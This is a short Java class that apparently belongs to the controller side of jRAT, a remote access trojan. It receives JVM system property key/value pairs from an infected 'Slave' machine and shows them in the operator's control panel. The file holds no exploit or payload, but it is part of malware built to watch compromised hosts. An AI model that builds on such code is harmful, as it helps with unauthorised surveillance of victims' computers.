package jrat.controller.packets.incoming;

import jrat.controller.Slave;
import jrat.controller.ui.frames.FrameControlPanel;
import jrat.controller.ui.panels.PanelControlJVMProperties;


public class Packet44SystemJavaProperty extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String key = slave.readLine();
		String value = slave.readLine();
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		if (frame != null) {
			PanelControlJVMProperties panel = (PanelControlJVMProperties) frame.panels.get("jvm info");
			panel.getModel().addRow(new Object[] { key, value });
		}
	}

}
